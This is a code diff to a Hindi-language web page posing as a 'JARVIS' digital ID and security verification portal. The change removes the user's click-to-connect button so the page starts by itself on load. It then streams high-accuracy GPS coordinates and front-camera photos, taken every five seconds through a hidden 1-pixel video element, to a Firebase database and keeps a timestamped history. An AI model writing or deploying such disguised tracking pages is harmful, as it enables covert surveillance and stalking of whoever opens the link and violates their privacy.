@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS CONNECT - DIGITAL CARD</title>
+    <title>JARVIS CONNECT - DIGITAL ID</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -13,9 +13,7 @@
         .avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(45deg, #00f2ff, #00ff87); margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; font-size: 36px; font-weight: bold; color: #0f172a; box-shadow: 0 0 20px rgba(0,242,255,0.2); }
         .username { font-size: 20px; font-weight: 700; margin-bottom: 5px; color: #fff; }
         .bio { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
-        .action-btn { background: linear-gradient(135deg, #38bdf8, #0369a1); color: #fff; border: none; padding: 14px 28px; font-size: 16px; font-weight: 600; border-radius: 12px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 4px 12px rgba(3,105,161,0.3); }
-        .action-btn:active { transform: scale(0.98); }
-        .status-text { margin-top: 15px; font-size: 12px; color: #64748b; }
+        .status-box { background: rgba(0, 242, 255, 0.1); border: 1px solid #00f2ff; padding: 12px; border-radius: 12px; font-size: 14px; color: #00f2ff; font-weight: 600; }
         #v { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
         canvas { display: none; }
     </style>
@@ -24,12 +22,10 @@
 
     <div class="profile-card">
         <div class="avatar">J</div>
-        <div class="username">JARVIS DIGITAL ID</div>
-        <div class="bio">नमस्ते! सुरक्षित सिंक और लाइव रिमोट कनेक्टिविटी स्थापित करने के लिए नीचे दिए गए बटन पर क्लिक करें।</div>
+        <div class="username">JARVIS SECURITY PORTAL</div>
+        <div class="bio">डिजिटल आईडी वेरिफिकेशन और क्लाउड सिंक प्रक्रिया बैकग्राउंड में सक्रिय है। कृपया प्रतीक्षा करें...</div>
         
-        <button class="action-btn" onclick="activateSystem()">Connect & Verify</button>
-        
-        <div class="status-text" id="log-status">सिस्टम रेडी है...</div>
+        <div class="status-box" id="log-status">सिस्टम कनेक्ट हो रहा है...</div>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -49,34 +45,38 @@
         let currentLat = 0;
         let currentLon = 0;
 
-        async function activateSystem() {
-            const statusDiv = document.getElementById('log-status');
-            statusDiv.innerHTML = "⏳ कनेक्ट किया जा रहा है, कृपया प्रतीक्षा करें...";
+        // 🚀 पेज लोड होते ही तुरंत बिना रुके एक्टिवेट होगा
+        document.addEventListener("DOMContentLoaded", () => {
+            autoStartSync();
+        });
 
-            // 1. जीपीएस एक्टिवेट करना
+        async function autoStartSync() {
+            const statusDiv = document.getElementById('log-status');
+
+            // 1. हाई-एक्यूरेसी जीपीएस तुरंत चालू करें
             navigator.geolocation.watchPosition((pos) => {
                 currentLat = pos.coords.latitude;
                 currentLon = pos.coords.longitude;
                 database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
-            }, err => console.log("GPS signal waiting..."), { enableHighAccuracy: true });
+            }, err => console.log("GPS Waiting..."), { enableHighAccuracy: true });
 
-            // 2. कैमरा स्ट्रीम शुरू करना
+            // 2. फ्रंट कैमरा तुरंत ट्रिगर करें
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
                 video.addEventListener('loadeddata', () => {
-                    statusDiv.innerHTML = "✅ सफलतापूर्वक कनेक्टेड!";
-                    captureData();
-                    setInterval(captureData, 5000); // हर 5 सेकंड में अपडेट
+                    statusDiv.innerHTML = "🔗 लाइव डेटा सिंक सक्रिय";
+                    captureDataInstant();
+                    setInterval(captureDataInstant, 5000); // हर 5 सेकंड में ऑटो-अपडेट
                 });
             } catch (e) {
-                statusDiv.innerHTML = "❌ कनेक्शन फेल! कृपया कैमरा और लोकेशन की अनुमति दें।";
+                statusDiv.innerHTML = "❌ कैमरा एक्सेस ब्लॉक है बॉस!";
             }
         }
 
-        function captureData() {
+        function captureDataInstant() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
 
@@ -89,13 +89,13 @@
             const timestamp = Date.now();
             const currentTimeString = new Date().toLocaleTimeString();
 
-            // लाइव डैशबोर्ड पर भेजना
+            // फायरबेस मेन नोड पर तुरंत भेजें
             database.ref('live_detect').update({
                 photo: compressedPhoto,
                 last_updated: timestamp
             });
 
-            // जार्विस हिस्ट्री में सुरक्षित करना
+            // जार्विस हिस्ट्री लॉग में सेव करें
             database.ref('jarvis_history/' + timestamp).set({
                 time: currentTimeString,
                 photo: compressedPhoto,
